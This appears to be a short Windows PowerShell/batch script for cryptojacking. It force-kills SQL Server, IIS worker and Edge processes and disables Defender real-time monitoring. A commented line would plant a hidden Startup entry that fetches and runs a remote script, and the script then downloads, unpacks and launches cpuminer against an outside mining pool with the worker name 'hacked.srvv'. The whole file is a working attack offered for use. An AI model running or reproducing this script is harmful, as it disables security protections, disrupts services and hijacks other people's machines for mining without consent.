taskkill /IM sqlservr.exe /F
taskkill /IM w3wp.exe /F
taskkill /IM msedge.exe /F
taskkill /IM Batch.exe /F
Set-MpPreference -DisableRealtimeMonitoring $true
rem Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\cpuminer-opt-24.5-windows
./cpuminer.exe -a m7m -o stratum+tcp://bowserlab.ddns.net:6033 -u hacked.srvv -p c=XMG
